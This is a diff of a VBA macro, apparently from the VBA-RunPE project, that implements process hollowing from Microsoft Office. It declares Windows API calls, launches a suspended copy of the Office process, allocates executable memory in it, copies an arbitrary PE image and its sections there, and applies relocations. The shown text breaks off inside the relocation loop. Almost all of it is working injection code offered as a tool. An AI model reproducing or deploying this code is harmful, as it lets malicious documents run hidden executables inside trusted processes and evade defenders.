@@ -2,7 +2,7 @@
 ' Title: VBA RunPE
 ' Filename: RunPE.vba
 ' GitHub: https://github.com/itm4n/VBA-RunPE
-' Date: 2018-01-28
+' Date: 2019-12-14
 ' Author: Clement Labro (@itm4n)
 ' Description: A RunPE implementation in VBA with Windows API calls. It is
 '   compatible with both 32 bits and 64 bits versions of Microsoft Office.
@@ -13,12 +13,10 @@
 '        2. Enable View > Immediate Window (Ctrl + G) (to check execution and error
 '               logs)
 '        3. Run the macro!
-' Tested on: - Windows 7 Pro 32 bits + Office 2010 32 bits
-'            - Windows 7 Pro 64 bits + Office 2016 32 bits
-'            - Windows 2008 R2 64 bits + Office 2010 64 bits
+' Tested on: - Windows 7 Pro 64 bits + Office 2016 32 bits
 '            - Windows 10 Pro 64 bits + Office 2016 64 bits
-' Credit: https://github.com/Zer0Mem0ry/RunPE (C++ RunPE implementation - 32 bits
-'   only)
+' Credit: @hasherezade - https://github.com/hasherezade/ (RunPE written in C++  
+'   with dynamic relocations)
 ' --------------------------------------------------------------------------------
 
 Option Explicit
@@ -31,9 +29,11 @@ Option Explicit
     Private Declare PtrSafe Function GetModuleFileName Lib "KERNEL32" Alias "GetModuleFileNameA" (ByVal hModule As LongPtr, ByVal lpFilename As String, ByVal nSize As Long) As Long
     Private Declare PtrSafe Function CreateProcess Lib "KERNEL32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As LongPtr, ByVal lpThreadAttributes As LongPtr, ByVal bInheritHandles As Boolean, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
     Private Declare PtrSafe Function GetThreadContext Lib "KERNEL32" (ByVal hThread As LongPtr, lpContext As CONTEXT) As Long
-    Private Declare PtrSafe Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesRead As Long) As Long
+    Private Declare PtrSafe Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesRead As LongPtr) As Long
+    Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
     Private Declare PtrSafe Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
-    Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
+    Private Declare PtrSafe Function VirtualFree Lib "KERNEL32" (ByVal lpAddress As LongPtr, dwSize As Long, dwFreeType As Long) As Long
+    Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As LongPtr) As Long
     Private Declare PtrSafe Function SetThreadContext Lib "KERNEL32" (ByVal hThread As LongPtr, lpContext As CONTEXT) As Long
     Private Declare PtrSafe Function ResumeThread Lib "KERNEL32" (ByVal hThread As LongPtr) As Long
     Private Declare PtrSafe Function TerminateProcess Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal uExitCode As Integer) As Long
@@ -42,9 +42,11 @@ Option Explicit
     Private Declare Function GetModuleFileName Lib "KERNEL32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFilename As String, ByVal nSize As Long) As Long
     Private Declare Function CreateProcess Lib "KERNEL32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Boolean, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
     Private Declare Function GetThreadContext Lib "KERNEL32" (ByVal hThread As Long, lpContext As CONTEXT) As Long
-    Private Declare Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As Long, ByVal nSize As Long, ByVal lpNumberOfBytesRead As Long) As Long
-    Private Declare Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
-    Private Declare Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As Long, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
+    Private Declare Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As LongPtr, ByVal nSize As Long, ByVal lpNumberOfBytesRead As LongPtr) As Long
+    Private Declare Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+    Private Declare Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+    Private Declare Function VirtualFree Lib "KERNEL32" (ByVal lpAddress As LongPtr, dwSize As Long, dwFreeType As Long) As Long
+    Private Declare Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As Long, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As LongPtr) As Long
     Private Declare Function SetThreadContext Lib "KERNEL32" (ByVal hThread As Long, lpContext As CONTEXT) As Long
     Private Declare Function ResumeThread Lib "KERNEL32" (ByVal hThread As Long) As Long
     Private Declare Function TerminateProcess Lib "KERNEL32" (ByVal hProcess As Long, ByVal uExitCode As Integer) As Long
@@ -94,6 +96,12 @@ End Type
 Private Type IMAGE_DATA_DIRECTORY
     VirtualAddress As Long      'DWORD   VirtualAddress;
     Size As Long                'DWORD   Size;
+End Type
+
+' undocumented
+Private Type IMAGE_BASE_RELOCATION
+    VirtualAddress As Long        'DWORD   VirtualAddress
+    SizeOfBlock As Long           'DWORD   SizeOfBlock
 End Type
 
 ' https://msdn.microsoft.com/fr-fr/library/windows/desktop/ms680313(v=vs.85).aspx
@@ -353,17 +361,37 @@ Private Const PAGE_READWRITE = &H4
 Private Const PAGE_EXECUTE_READWRITE = &H40
 Private Const MAX_PATH = 260
 Private Const CREATE_SUSPENDED = &H4
-Private Const CONTEXT_FULL = &H10007
+
+Private Const CONTEXT_AMD64 = &H100000
+Private Const CONTEXT_I386 = &H10000
+#If Win64 Then
+    Private Const CONTEXT_ARCH = CONTEXT_AMD64
+#Else
+    Private Const CONTEXT_ARCH = CONTEXT_I386
+#End If
+Private Const CONTEXT_CONTROL = CONTEXT_ARCH Or &H1
+Private Const CONTEXT_INTEGER = CONTEXT_ARCH Or &H2
+Private Const CONTEXT_SEGMENTS = CONTEXT_ARCH Or &H4
+Private Const CONTEXT_FLOATING_POINT = CONTEXT_ARCH Or &H8
+Private Const CONTEXT_DEBUG_REGISTERS = CONTEXT_ARCH Or &H10
+Private Const CONTEXT_EXTENDED_REGISTERS = CONTEXT_ARCH Or &H20
+Private Const CONTEXT_FULL = CONTEXT_CONTROL Or CONTEXT_INTEGER Or CONTEXT_SEGMENTS
 
 
 ' ================================================================================
 '                     ~~~ CONSTANTS USED IN THE MAIN SUB ~~~
 ' ================================================================================
-Private Const IMAGE_DOS_SIGNATURE = &H5A4D          '0x5A4D      // MZ
-Private Const IMAGE_NT_SIGNATURE = &H4550           '0x00004550  // PE00
-Private Const IMAGE_FILE_MACHINE_I386 = &H14C       '32 bits PE (IMAGE_NT_HEADERS.IMAGE_FILE_HEADER.Machine)
-Private Const IMAGE_FILE_MACHINE_AMD64 = &H8664     '64 bits PE (IMAGE_NT_HEADERS.IMAGE_FILE_HEADER.Machine)
+Private Const VERBOSE = False                       ' Set to True for debugging
+Private Const IMAGE_DOS_SIGNATURE = &H5A4D          ' 0x5A4D      // MZ
+Private Const IMAGE_NT_SIGNATURE = &H4550           ' 0x00004550  // PE00
+Private Const IMAGE_FILE_MACHINE_I386 = &H14C       ' 32 bits PE (IMAGE_NT_HEADERS.IMAGE_FILE_HEADER.Machine)
+Private Const IMAGE_FILE_MACHINE_AMD64 = &H8664     ' 64 bits PE (IMAGE_NT_HEADERS.IMAGE_FILE_HEADER.Machine)
+Private Const SIZEOF_IMAGE_DOS_HEADER = 64
 Private Const SIZEOF_IMAGE_SECTION_HEADER = 40
+Private Const SIZEOF_IMAGE_FILE_HEADER = 20
+Private Const SIZEOF_IMAGE_DATA_DIRECTORY = 8
+Private Const SIZEOF_IMAGE_BASE_RELOCATION = 8
+Private Const SIZEOF_IMAGE_BASE_RELOCATION_ENTRY = 2
 #If Win64 Then
     Private Const SIZEOF_IMAGE_NT_HEADERS = 264
     Private Const SIZEOF_ADDRESS = 8
@@ -371,6 +399,21 @@ Private Const SIZEOF_IMAGE_SECTION_HEADER = 40
     Private Const SIZEOF_IMAGE_NT_HEADERS = 248
     Private Const SIZEOF_ADDRESS = 4
 #End If
+
+' Data Directories
+' |__ IMAGE_OPTIONAL_HEADER contains an array of 16 IMAGE_DATA_DIRECTORY structures
+' |__ Each IMAGE_DATA_DIRECTORY structure as a "predefined role", as defined by these constants (in winnt.h)
+Private Const IMAGE_DIRECTORY_ENTRY_EXPORT = 0       ' Export Directory
+Private Const IMAGE_DIRECTORY_ENTRY_IMPORT = 1       ' Import Directory
+Private Const IMAGE_DIRECTORY_ENTRY_RESOURCE = 2     ' Resource Directory
+Private Const IMAGE_DIRECTORY_ENTRY_EXCEPTION = 3    ' Exception Directory
+Private Const IMAGE_DIRECTORY_ENTRY_SECURITY = 4     ' Security Directory
+Private Const IMAGE_DIRECTORY_ENTRY_BASERELOC = 5    ' Base Relocation Table
+Private Const IMAGE_DIRECTORY_ENTRY_DEBUG = 6        ' Debug Directory
+Private Const IMAGE_DIRECTORY_ENTRY_COPYRIGHT = 7    ' Description String
+Private Const IMAGE_DIRECTORY_ENTRY_GLOBALPTR = 8    ' Machine Value (MIPS GP)
+Private Const IMAGE_DIRECTORY_ENTRY_TLS = 9          ' TLS Directory
+Private Const IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG = 10 ' Load Configuration Directory
 
 
 ' ================================================================================
@@ -437,7 +480,6 @@ End Function
 ' Returns:   The content of the String as a Byte array
 ' --------------------------------------------------------------------------------
 Private Function StringToByteArray(strContent As String) As Byte()
-    ' String to Byte array
     Dim baContent() As Byte
     baContent = StrConv(strContent, vbFromUnicode)
     StringToByteArray = baContent
@@ -492,20 +534,26 @@ End Function
 ' Returns:   N/A
 ' --------------------------------------------------------------------------------
 Public Sub RunPE(ByRef baImage() As Byte, strArguments As String)
+
+    Debug.Print ("[*] Checking source PE...")
     ' Populate IMAGE_DOS_HEADER structure
     ' |__ IMAGE_DOS_HEADER size is 64 (0x40)
     Dim structDOSHeader As IMAGE_DOS_HEADER
     Dim ptrDOSHeader As LongPtr: ptrDOSHeader = VarPtr(structDOSHeader)
-    Call RtlMoveMemory(ptrDOSHeader, VarPtr(baImage(0)), 64)
+    Call RtlMoveMemory(ptrDOSHeader, VarPtr(baImage(0)), SIZEOF_IMAGE_DOS_HEADER)
+    
     
     ' Check Magic Number (i.e. is it a PE file?)
     ' |__ Magic number = 0x5A4D or 23117 or 'MZ'
     If structDOSHeader.e_magic = IMAGE_DOS_SIGNATURE Then
-        Debug.Print ("[+] |__ Magic number is OK.")
+        If VERBOSE Then
+            Debug.Print ("    |__ Magic number is OK.")
+        End If
     Else
-        Debug.Print ("[-] |__ Input file is not a valid PE.")
+        Debug.Print ("    |__ Input file is not a valid PE.")
         Exit Sub
     End If
+    
     
     ' Populate IMAGE_NT_HEADERS structure
     ' |__ IMAGE_NT_HEADERS start at offset DOSHeader->e_lfanew
@@ -515,17 +563,23 @@ Public Sub RunPE(ByRef baImage() As Byte, strArguments As String)
     Dim ptrNTHeaders As LongPtr: ptrNTHeaders = VarPtr(structNTHeaders)
     Call RtlMoveMemory(ptrNTHeaders, VarPtr(baImage(structDOSHeader.e_lfanew)), SIZEOF_IMAGE_NT_HEADERS)
     
+    
     ' Check NT headers Signature
     ' |__ NT Header Signature = 'PE00' or 0x00004550 or 17744
     If structNTHeaders.Signature = IMAGE_NT_SIGNATURE Then
-        Debug.Print ("[+] |__ NT Header Signature is valid.")
+        If VERBOSE Then
+            Debug.Print ("    |__ NT Header Signature is OK.")
+        End If
     Else
-        Debug.Print ("[-] |__ NT Header Signature is not valid.")
+        Debug.Print ("    |__ NT Header Signature is not valid.")
         Exit Sub
     End If
     
+    
     ' Check CPU architecture
-    Debug.Print ("[*] |__ Machine type: 0x" + Hex(structNTHeaders.FileHeader.Machine))
+    If VERBOSE Then
+        Debug.Print ("    |__ Machine type: 0x" + Hex(structNTHeaders.FileHeader.Machine))
+    End If
     #If Win64 Then
         If structNTHeaders.FileHeader.Machine = IMAGE_FILE_MACHINE_I386 Then
             Debug.Print ("[-] You're trying to inject a 32 bits binary into a 64 bits process!")
@@ -538,169 +592,344 @@ Public Sub RunPE(ByRef baImage() As Byte, strArguments As String)
         End If
     #End If
     
+    
     ' Get the path of the current process executable
     Dim strCurrentFilePath As String
     strCurrentFilePath = Space(MAX_PATH) ' Allocate memory to store the path
     Dim lGetModuleFileName As Long
     lGetModuleFileName = GetModuleFileName(0, strCurrentFilePath, MAX_PATH)
     strCurrentFilePath = Left(strCurrentFilePath, InStr(strCurrentFilePath, vbNullChar) - 1) ' Remove NULL bytes
-    Debug.Print ("[*] Current process: '" + strCurrentFilePath + "'")
+    
+    
+    ' Format command line
+    Dim strCmdLine As String
+    strCmdLine = strCurrentFilePath + " " + strArguments
+    
     
     ' Create new process in suspended state
+    Debug.Print ("[*] Creating new process in suspended state...")
     Dim strNull As String
     Dim structProcessInformation As PROCESS_INFORMATION
     Dim structStartupInfo As STARTUPINFO
+    If VERBOSE Then
+        Debug.Print ("    |__ Target PE: '" + strCurrentFilePath + "'")
+    End If
     Dim lCreateProcess As Long
     lCreateProcess = CreateProcess(strNull, strCurrentFilePath + " " + strArguments, 0&, 0&, False, CREATE_SUSPENDED, 0&, strNull, structStartupInfo, structProcessInformation)
     If lCreateProcess = 0 Then
-        Debug.Print ("[-] Process creation failed.")
+        Debug.Print ("    |__ CreateProcess() failed (Err: " + Str(Err.LastDllError) + ").")
         Exit Sub
     Else
-        Debug.Print ("[+] Created new process in suspended state.")
+        If VERBOSE Then
+            Debug.Print ("    |__ CreateProcess() OK")
+        End If
     End If
     
-    ' Get Thread context of the new process
-    ' |__ CONTEXT_FULL - Identifier to use to get all the thread's important registers
+    
+    ' Get Thread Context
+    Debug.Print ("[*] Retrieving the context of the main thread...")
     Dim structContext As CONTEXT
-    structContext.ContextFlags = CONTEXT_FULL
+    structContext.ContextFlags = CONTEXT_INTEGER 'CONTEXT_FULL
     Dim lGetThreadContext As Long
     lGetThreadContext = GetThreadContext(structProcessInformation.hThread, structContext)
     If lGetThreadContext = 0 Then
-        Debug.Print ("[-] |__ Couldn't get thread context.")
+        Debug.Print ("    |__ GetThreadContext() failed (Err: " + Str(Err.LastDllError) + ")")
         Call TerminateProcess(structProcessInformation.hProcess, 0)
         Exit Sub
     Else
-        Debug.Print ("[+] |__ Got thread context")
+        If VERBOSE Then
+            Debug.Print ("    |__ GetThreadContext() OK")
+        End If
     End If
     
-    ' Get image base address of the new process
+    
+    ' Get image base of the target process (if we want to unmap it before injecting our PE)
     ' |__ Image base address is CONTEXT.ebx + 8 (32 bits)
     ' |__ Image base address is CONTEXT.rdx + 16 (64 bits)
-    Dim lImageBase As LongPtr
-    #If Win64 Then
-        Dim lImageBaseAddrLocation As LongPtr: lImageBaseAddrLocation = structContext.Rdx + 16
-    #Else
-        Dim lImageBaseAddrLocation As LongPtr: lImageBaseAddrLocation = structContext.Ebx + 8
-    #End If
-    Dim ptrImageBase As LongPtr: ptrImageBase = VarPtr(lImageBase)
-    Dim lReadProcessMemory As Long
-    lReadProcessMemory = ReadProcessMemory(structProcessInformation.hProcess, lImageBaseAddrLocation, ptrImageBase, SIZEOF_ADDRESS, 0)
-    If lReadProcessMemory = 0 Then
-        Debug.Print ("[-] |__ Couldn't read image base address.")
-        Call TerminateProcess(structProcessInformation.hProcess, 0)
-        Exit Sub
-    Else
-        Debug.Print ("[+] |__ Got image base address: 0x" + Hex(lImageBase))
+    'Debug.Print ("[*] Reading target process base image address...")
+    'Dim ptrTargetImageBase As LongPtr
+    'Dim ptrTargetImageBaseLocation As LongPtr
+    '#If Win64 Then
+    '    ptrTargetImageBaseLocation = structContext.Rdx + 16
+    '#Else
+    '    ptrTargetImageBaseLocation = structContext.Ebx + 8
+    '#End If
+    
+    'Dim lReadProcessMemory As Long
+    'lReadProcessMemory = ReadProcessMemory(structProcessInformation.hProcess, ptrTargetImageBaseLocation, VarPtr(ptrTargetImageBase), SIZEOF_ADDRESS, 0)
+    'If lReadProcessMemory = 0 Then
+    '    Debug.Print ("    |__ ReadProcessMemory() failed (Err:" + Str(Err.LastDllError) + ")")
+    '    Call TerminateProcess(structProcessInformation.hProcess, 0)
+    '    Exit Sub
+    'Else
+    '    If VERBOSE Then
+    '        Debug.Print ("    |__ Target process image base address: Ox" + Hex(ptrTargetImageBase))
+    '    End If
+    'End If
+    
+    
+    ' Unmap target image (optional)
+    ' We don't really need to unmap the current image
+    
+    
+    ' Get Relocation directory and check if the PE has a relocation table
+    ' |__ NTHeaders.OptionalHeader.DataDirectory[5]
+    Dim structRelocDirectory As IMAGE_DATA_DIRECTORY
+    Call RtlMoveMemory(VarPtr(structRelocDirectory), VarPtr(structNTHeaders.OptionalHeader.DataDirectory(IMAGE_DIRECTORY_ENTRY_BASERELOC)), SIZEOF_IMAGE_DATA_DIRECTORY)
+    
+    Dim ptrDesiredImageBase As LongPtr: ptrDesiredImageBase = 0
+    If structRelocDirectory.VirtualAddress = 0 Then
+        Debug.Print ("[!] PE has no relocation table, using default base address: 0x" + Hex(structNTHeaders.OptionalHeader.ImageBase))
+        ptrDesiredImageBase = structNTHeaders.OptionalHeader.ImageBase
     End If
     
+
     ' Allocate memory for the source image in the new process
-    Dim lProcessImageBase As LongPtr
-    lProcessImageBase = VirtualAllocEx(structProcessInformation.hProcess, structNTHeaders.OptionalHeader.ImageBase, structNTHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT + MEM_RESERVE, PAGE_EXECUTE_READWRITE)
-    If lProcessImageBase = 0 Then
-        Debug.Print ("[-] Couldn't allocate memory for the source image")
+    Debug.Print ("[*] Allocating memory for the source image in process with PID" + Str(structProcessInformation.dwProcessId) + "...")
+    If VERBOSE Then
+        Debug.Print ("    |__ PE image size: " + Str(structNTHeaders.OptionalHeader.SizeOfImage))
+    End If
+    Dim ptrProcessImageBase As LongPtr
+    ptrProcessImageBase = VirtualAllocEx(structProcessInformation.hProcess, ptrDesiredImageBase, structNTHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+    If ptrProcessImageBase = 0 Then
+        Debug.Print ("    |__ VirtualAllocEx() failed (Err:" + Str(Err.LastDllError) + ").")
         Call TerminateProcess(structProcessInformation.hProcess, 0)
         Exit Sub
     Else
-        Debug.Print ("[+] Allocated memory for the source image at address: 0x" + Hex(lProcessImageBase))
-    End If
-    
-    ' Write PE headers at the beginning of the allocated buffer
-    Debug.Print ("[*] Writing PE headers")
-    Dim lWriteProcessMemory As Long
-    lWriteProcessMemory = WriteProcessMemory(structProcessInformation.hProcess, lProcessImageBase, VarPtr(baImage(0)), structNTHeaders.OptionalHeader.SizeOfHeaders, 0&)
-    If lWriteProcessMemory = 0 Then
-        Debug.Print ("[-] Error: 'WriteProcessMemory'")
-        Call TerminateProcess(structProcessInformation.hProcess, 0)
-        Exit Sub
-    Else
-        Debug.Print ("[+] Wrote PE Headers at: 0x" + Hex(lProcessImageBase) + " (size:" + Str(structNTHeaders.OptionalHeader.SizeOfHeaders) + ")")
-    End If
-    
-    ' Write sections of the PE to the allocated buffer
-    Dim iCount As Integer
-    Dim structSectionHeader As IMAGE_SECTION_HEADER
-    Dim ptrSectionHeader As LongPtr: ptrSectionHeader = VarPtr(structSectionHeader)
-    For iCount = 0 To structNTHeaders.FileHeader.NumberOfSections - 1
-        ' Nth section is at offset:
-        '  0 (image base)
-        '  + DOSHeader->e_lfanew  NT headers base address
-        '  + 248 OR 264           IMAGE_NT_HEADERS size is 248 (32 bits) or 264 (64 bits)
-        '  + N * 40               IMAGE_SECTION_HEADER is 40 (32 & 64 bits)
-        Call RtlMoveMemory(ptrSectionHeader, VarPtr(baImage(structDOSHeader.e_lfanew + SIZEOF_IMAGE_NT_HEADERS + (iCount * SIZEOF_IMAGE_SECTION_HEADER))), SIZEOF_IMAGE_SECTION_HEADER)
-        
-        Dim strSectionName As String: strSectionName = ByteArrayToString(structSectionHeader.SecName)
-        Dim lNewAddress As LongPtr: lNewAddress = lProcessImageBase + structSectionHeader.VirtualAddress
-        Dim lSize As Long: lSize = structSectionHeader.SizeOfRawData
-        
-        Debug.Print ("[*] Writing section '" + strSectionName + "'")
-        Debug.Print ("[*] |__ Image base: 0x" + Hex(lProcessImageBase))
-        Debug.Print ("[*] |__ Section virtual address: 0x" + Hex(structSectionHeader.VirtualAddress))
-        Debug.Print ("[*] |__ New address (base+virt.): 0x" + Hex(lNewAddress))
-        Debug.Print ("[*] |__ Raw data address (buffer): 0x" + Hex(VarPtr(baImage(0 + structSectionHeader.PointerToRawData))))
-        Debug.Print ("[*] |__ Section size:" + Str(lSize))
-        
-        lWriteProcessMemory = WriteProcessMemory(structProcessInformation.hProcess, lNewAddress, VarPtr(baImage(0 + structSectionHeader.PointerToRawData)), lSize, 0&)
-        If lWriteProcessMemory = 0 Then
-            Debug.Print ("[-] Error: 'WriteProcessMemory'")
-            Call TerminateProcess(structProcessInformation.hProcess, 0)
-            Exit Sub
-        Else
-            Debug.Print ("[+] Wrote section '" + strSectionName + "' at address 0x" + Hex(lNewAddress) + " (size:" + Str(lSize) + ")")
+        If VERBOSE Then
+            Debug.Print ("    |__ VirtualAllocEx() OK - Got Addr: 0x" + Hex(ptrProcessImageBase))
         End If
-    Next iCount
+    End If
     
-    ' Referencing new image base address in thread context
-    Debug.Print ("[*] Modifying context to point to new image base")
-    #If Win64 Then
-        Dim lAddrLocation As LongPtr: lAddrLocation = structContext.Rdx + 16
-    #Else
-        Dim lAddrLocation As LongPtr: lAddrLocation = structContext.Ebx + 8
-    #End If
-    Debug.Print ("[*] |__ Where to write new image base address: 0x" + Hex(lAddrLocation))
-    Debug.Print ("[*] |__ Image base address: 0x" + Hex(structNTHeaders.OptionalHeader.ImageBase))
     
-    lWriteProcessMemory = WriteProcessMemory(structProcessInformation.hProcess, lAddrLocation, VarPtr(structNTHeaders.OptionalHeader.ImageBase), SIZEOF_ADDRESS, 0&)
-    If lWriteProcessMemory = 0 Then
-        Debug.Print ("[-] Error: 'WriteProcessMemory'")
-        Call TerminateProcess(structProcessInformation.hProcess, 0)
-        Exit Sub
-    Else
-        Debug.Print ("[+] Wrote image base address 0x" + Hex(structNTHeaders.OptionalHeader.ImageBase) + " at address 0x" + Hex(lAddrLocation))
+    ' Change the image base saved in headers
+    ' |__ IMAGE_NT_HEADERS is at offset: 0 + IMAGE_DOS_HEADER.e_lfanew
+    ' |__ IMAGE_NT_HEADERS = Signature || IMAGE_FILE_HEADER || IMAGE_OPTIONAL_HEADER
+    ' |__ In IMAGE_OPTIONAL_HEADER32, ImageBase is at offset 28
+    ' |__ => ImageBase is at offset: 0 + IMAGE_DOS_HEADER.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 28
+    ' |__ In IMAGE_OPTIONAL_HEADER64, ImageBase is at offset 24
+    ' |__ => ImageBase is at offset: 0 + IMAGE_DOS_HEADER.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 24
+    If ptrProcessImageBase <> structNTHeaders.OptionalHeader.ImageBase Then
+        Dim lImageBaseAddrOffset As Long
+        Dim ptrImageBase As LongPtr
+        #If Win64 Then
+            lImageBaseAddrOffset = 0 + structDOSHeader.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 24
+        #Else
+            lImageBaseAddrOffset = 0 + structDOSHeader.e_lfanew + 4 + SIZEOF_IMAGE_FILE_HEADER + 28
+        #End If
+
+        'Call RtlMoveMemory(VarPtr(ptrImageBase), VarPtr(baImage(0 + lImageBaseAddrOffset)), SIZEOF_ADDRESS) ' Read current value
+        'Debug.Print ("Current image base: 0x" + Hex(ptrImageBase) + " - Image base to write: 0x" + Hex(ptrProcessImageBase))
+        
+        Call RtlMoveMemory(VarPtr(baImage(0 + lImageBaseAddrOffset)), VarPtr(ptrProcessImageBase), SIZEOF_ADDRESS) ' Write new value
+        
+        'Call RtlMoveMemory(VarPtr(ptrImageBase), VarPtr(baImage(0 + lImageBaseAddrOffset)), SIZEOF_ADDRESS) ' Read current value to verify
+        'Debug.Print ("New effective image base: 0x" + Hex(ptrImageBase))
     End If
 
-    ' Set entry point
-    Debug.Print ("[*] Applying new context")
-    Dim lEntryPoint As LongPtr: lEntryPoint = lProcessImageBase + structNTHeaders.OptionalHeader.AddressOfEntryPoint
-    #If Win64 Then
-        structContext.Rcx = lEntryPoint
-    #Else
-        structContext.Eax = lEntryPoint
-    #End If
-    Debug.Print ("[*] |__ Set new entry point: 0x" + Hex(lEntryPoint))
+
+    ' Allocate some memory in the current process to store the source image
+    Debug.Print ("[*] Allocating memory for the source image in current process...")
+    Dim ptrImageLocalCopy As LongPtr
+    ptrImageLocalCopy = VirtualAlloc(0&, structNTHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+    If ptrImageLocalCopy = 0 Then
+        Debug.Print ("    |__ VirtualAlloc() failed (Err:" + Str(Err.LastDllError) + ").")
+        Call TerminateProcess(structProcessInformation.hProcess, 0)
+        Exit Sub
+    Else
+        If VERBOSE Then
+            Debug.Print ("    |__ VirtualAlloc() OK - Got Addr: 0x" + Hex(ptrImageLocalCopy))
+        End If
+    End If
     
-    ' Set the context to the new thread
+    
+    ' Copy source image to local memory
+    Debug.Print ("[*] Writing source image in current process...")
+    If VERBOSE Then
+        Debug.Print ("    |__ Target address: 0x" + Hex(ptrImageLocalCopy))
+
+        Debug.Print ("[*] Writing PE headers...")
+        Debug.Print ("    |__ Headers size:" + Str(structNTHeaders.OptionalHeader.SizeOfHeaders))
+    End If
+    Call RtlMoveMemory(ptrImageLocalCopy, VarPtr(baImage(0)), structNTHeaders.OptionalHeader.SizeOfHeaders)
+    
+    If VERBOSE Then
+        Debug.Print ("[*] Writing PE sections...")
+    End If
+    Dim iCount As Integer
+    Dim structSectionHeader As IMAGE_SECTION_HEADER
+    For iCount = 0 To (structNTHeaders.FileHeader.NumberOfSections - 1)
+        ' Nth section is at offset:
+        '  0 (image base)
+        '  + DOSHeader->e_lfanew  Image base address
+        '  + 248 OR 264           IMAGE_NT_HEADERS size is 248 (32 bits) or 264 (64 bits)
+        '  + N * 40               IMAGE_SECTION_HEADER is 40 (32 & 64 bits)
+        Call RtlMoveMemory(VarPtr(structSectionHeader), VarPtr(baImage(structDOSHeader.e_lfanew + SIZEOF_IMAGE_NT_HEADERS + (iCount * SIZEOF_IMAGE_SECTION_HEADER))), SIZEOF_IMAGE_SECTION_HEADER)
+        
+        Dim strSectionName As String: strSectionName = ByteArrayToString(structSectionHeader.SecName)
+        Dim ptrNewAddress As LongPtr: ptrNewAddress = ptrImageLocalCopy + structSectionHeader.VirtualAddress
+        Dim lSize As Long: lSize = structSectionHeader.SizeOfRawData
+        
+        If VERBOSE Then
+            Debug.Print ("    |__ Writing section: '" + strSectionName + "' (Size:" + Str(lSize) + ") at 0x" + Hex(ptrNewAddress))
+        End If
+
+        Call RtlMoveMemory(ptrNewAddress, VarPtr(baImage(0 + structSectionHeader.PointerToRawData)), lSize)
+    Next iCount
+    
+
+    ' If the base address of the payload changed, we need to apply relocations
+    Debug.Print ("[*] Applying relocations...")
+    If ptrProcessImageBase <> structNTHeaders.OptionalHeader.ImageBase Then
+        
+        Dim lMaxSize As Long: lMaxSize = structRelocDirectory.Size
+        Dim lRelocAddr As Long: lRelocAddr = structRelocDirectory.VirtualAddress
+        
+        Dim structReloc As IMAGE_BASE_RELOCATION
+        Dim lParsedSize As Long: lParsedSize = 0
+        
+        Do While lParsedSize < lMaxSize
+        
+            Dim ptrStructReloc As LongPtr: ptrStructReloc = ptrImageLocalCopy + lRelocAddr + lParsedSize
+            Call RtlMoveMemory(VarPtr(structReloc), ptrStructReloc, SIZEOF_IMAGE_BASE_RELOCATION)
+            lParsedSize = lParsedSize + structReloc.SizeOfBlock
+            
+            If (structReloc.VirtualAddress <> 0) And (structReloc.SizeOfBlock <> 0) Then
+                If VERBOSE Then
+                    Debug.Print ("    |__ Relocation Block: Addr=0x" + Hex(structReloc.VirtualAddress) + " - Size:" + Str(structReloc.SizeOfBlock))
+                End If
+                
